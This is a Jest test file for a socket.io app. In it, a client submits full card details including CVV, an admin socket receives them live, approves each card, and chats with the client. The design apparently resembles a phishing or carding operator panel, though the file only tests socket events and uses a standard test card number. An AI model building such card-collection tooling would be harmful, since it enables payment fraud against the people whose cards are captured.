const io = require('socket.io-client');
const app = require('../index');
const http = require('http');

describe('WebSocket Tests', () => {
    let server;
    let clientSocket;
    let adminSocket;

    beforeAll((done) => {
        server = http.createServer(app);
        server.listen(() => {
            const port = server.address().port;
            clientSocket = io(`http://localhost:${port}`);
            adminSocket = io(`http://localhost:${port}`);
            done();
        });
    });

    afterAll(() => {
        server.close();
        clientSocket.close();
        adminSocket.close();
    });

    describe('Card Events', () => {
        it('should notify admin when new card is added', (done) => {
            const cardData = {
                holder: 'John Doe',
                number: '4111111111111111',
                exp: '12/25',
                cvv: '123',
                page: '1'
            };

            adminSocket.on('new_card', (data) => {
                expect(data.holder).toBe('John Doe');
                expect(data.number).toBe('4111111111111111');
                done();
            });

            clientSocket.emit('submit_card', cardData);
        });

        it('should broadcast card status updates', (done) => {
            const statusData = {
                id: 1,
                status: 'approved'
            };

            clientSocket.on('status_update', (data) => {
                expect(data.id).toBe(1);
                expect(data.status).toBe('approved');
                done();
            });

            adminSocket.emit('update_status', statusData);
        });
    });

    describe('Chat Functionality', () => {
        it('should deliver messages between admin and client', (done) => {
            const message = {
                text: 'Hello, need help?',
                from: 'admin'
            };

            clientSocket.on('chat_message', (data) => {
                expect(data.text).toBe('Hello, need help?');
                expect(data.from).toBe('admin');
                done();
            });

            adminSocket.emit('chat_message', message);
        });

        it('should maintain message history', (done) => {
            adminSocket.on('chat_history', (history) => {
                expect(Array.isArray(history)).toBeTruthy();
                if (history.length > 0) {
                    expect(history[0]).toHaveProperty('text');
                    expect(history[0]).toHaveProperty('from');
                }
                done();
            });

            adminSocket.emit('get_chat_history');
        });
    });

    describe('Connection Management', () => {
        it('should handle reconnection', (done) => {
            clientSocket.once('connect', () => {
                clientSocket.once('disconnect', () => {
                    clientSocket.once('connect', () => {
                        done();
                    });
                    clientSocket.connect();
                });
                clientSocket.disconnect();
            });
        });

        it('should maintain separate admin and client connections', (done) => {
            expect(clientSocket.connected).toBeTruthy();
            expect(adminSocket.connected).toBeTruthy();
            done();
        });
    });
}); 